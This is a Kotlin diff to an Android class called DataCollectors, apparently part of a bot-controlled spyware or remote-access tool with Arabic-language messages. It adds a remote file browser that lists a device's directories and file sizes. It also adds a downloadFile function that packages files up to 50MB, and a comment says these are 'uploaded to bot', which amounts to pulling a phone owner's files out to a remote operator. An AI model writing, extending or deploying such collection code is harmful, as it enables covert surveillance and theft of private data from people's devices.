@@ -673,20 +673,56 @@ class DataCollectors(private val context: Context) {
     }
 
     fun listFiles(path: String): Any {
-        val list = JSONArray()
         return try {
             val dir = File(path)
-            if (!dir.exists() || !dir.isDirectory) return errorJson("not_found", path)
-            for (f in (dir.listFiles()?.sortedBy { it.name } ?: emptyList()).take(200)) {
-                list.put(JSONObject().apply {
-                    put("name", f.name); put("is_directory", f.isDirectory)
-                    put("size", f.length()); put("path", f.absolutePath)
-                    put("last_modified", f.lastModified())
-                })
+            if (!dir.exists() || !dir.isDirectory) return CollectedData.TextResult("❌ المسار غير موجود: $path")
+            
+            val files = dir.listFiles()?.sortedBy { it.name } ?: emptyList()
+            if (files.isEmpty()) return CollectedData.TextResult("📁 المسار فارغ: $path")
+            
+            val sb = StringBuilder()
+            sb.appendLine("📂 محتويات: $path")
+            sb.appendLine("━━━━━━━━━━━━━━━")
+            
+            // Add parent directory link
+            if (dir.parentFile != null) {
+                sb.appendLine("📁 ../ (السابق)")
             }
-            CollectedData.JsonResult(list.toString())
-        } catch (e: SecurityException) { errorJson("permission_denied", path) }
-        catch (e: Exception) { errorJson("error", e.message ?: "unknown") }
+            
+            for (f in files.take(200)) {
+                if (f.isDirectory) {
+                    sb.appendLine("📁 ${f.name}/")
+                } else {
+                    val sizeKB = f.length() / 1024
+                    val sizeStr = if (sizeKB > 1024) "${sizeKB / 1024}MB" else "${sizeKB}KB"
+                    sb.appendLine("📄 ${f.name} ($sizeStr)")
+                }
+            }
+            
+            sb.appendLine()
+            sb.appendLine("💡 لتحميل ملف، استخدم: download-file:${'$'}{dir.absolutePath}/filename")
+            
+            CollectedData.TextResult(sb.toString())
+        } catch (e: SecurityException) { 
+            CollectedData.TextResult("❌ صلاحية مرفوضة: $path\nقد تحتاج إذن التخزين")
+        }
+        catch (e: Exception) { 
+            CollectedData.TextResult("❌ خطأ: ${e.message ?: "unknown"}")
+        }
+    }
+    
+    fun downloadFile(path: String): Any {
+        return try {
+            val file = File(path)
+            if (!file.exists()) return CollectedData.TextResult("❌ الملف غير موجود: $path")
+            if (file.isDirectory) return CollectedData.TextResult("❌ هذا مجلد وليس ملف: $path")
+            if (file.length() > 50 * 1024 * 1024) return CollectedData.TextResult("❌ الملف كبير جداً (الحد 50MB): ${file.length() / 1024 / 1024}MB")
+            
+            // Return as FileResult - will be uploaded to bot
+            CollectedData.FileResult(file, "download:$path")
+        } catch (e: Exception) {
+            CollectedData.TextResult("❌ خطأ في التحميل: ${e.message}")
+        }
     }
 
     // ════════════════════════════════════════════════════════════════
